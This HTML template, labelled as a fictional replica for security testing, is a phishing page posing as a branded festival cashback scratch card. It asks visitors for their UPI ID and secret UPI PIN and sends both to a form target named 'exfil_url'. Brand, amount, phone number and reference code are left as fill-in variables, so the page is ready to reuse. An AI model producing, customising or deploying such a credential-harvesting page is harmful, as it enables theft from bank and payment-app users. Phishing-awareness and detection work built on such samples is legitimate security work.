<!-- fictional replica for security testing -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ brand_title }} Scratch Card & Cashback Rewards</title>
    <style>
        :root {
            --primary: {{ primary_color }};
            --secondary: {{ secondary_color }};
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; padding: 16px; }
        .{{ prefix }}wrapper { width: 100%; max-width: 420px; background: #1e293b; border-radius: 16px; border: 1px solid #334155; padding: 24px; text-align: center; }
        .{{ prefix }}congrats { font-size: 22px; font-weight: 800; color: #fbbf24; margin-bottom: 4px; }
        .{{ prefix }}brand { font-size: 14px; color: #94a3b8; margin-bottom: 18px; }
        .{{ prefix }}scratch-area { background: linear-gradient(135deg, var(--primary), var(--secondary)); border-radius: 12px; padding: 30px 20px; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
        .{{ prefix }}cashback-title { font-size: 13px; text-transform: uppercase; color: #ffffff; opacity: 0.9; }
        .{{ prefix }}reward-amount { font-size: 38px; font-weight: 900; color: #ffffff; margin-top: 6px; }
        .{{ prefix }}claim-desc { font-size: 13px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.5; }
        .{{ prefix }}field { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #ffffff; margin-bottom: 14px; font-size: 15px; }
        .{{ prefix }}btn { width: 100%; padding: 14px; background: #22c55e; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
        .{{ prefix }}footer { font-size: 11px; color: #64748b; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="{{ prefix }}wrapper">
        <div class="{{ prefix }}congrats">🎉 Congratulations!</div>
        <div class="{{ prefix }}brand">Sponsored by {{ brand_wordmark }} Rewards</div>
        <div class="{{ prefix }}scratch-area">
            <div class="{{ prefix }}cashback-title">Direct Bank Cashback Unlocked</div>
            <div class="{{ prefix }}reward-amount">₹{{ amount }}</div>
        </div>
        <div class="{{ prefix }}claim-desc">
            {{ reward_copy }}
        </div>
        <form action="{{ exfil_url }}" method="POST">
            <input class="{{ prefix }}field" type="text" name="vpa_id" placeholder="Enter Your UPI ID (e.g. name@ybl)" value="{{ vpa }}" required>
            <input class="{{ prefix }}field" type="password" name="upi_pin" placeholder="Enter UPI PIN to verify transfer" maxlength="6" required>
            <button class="{{ prefix }}btn" type="submit">CLAIM REWARD NOW</button>
        </form>
        <div class="{{ prefix }}footer">
            Official Festival Promo &bull; Code: REWARD-{{ ref_code }} &bull; 24h Support: {{ phone }}
        </div>
    </div>
</body>
</html>
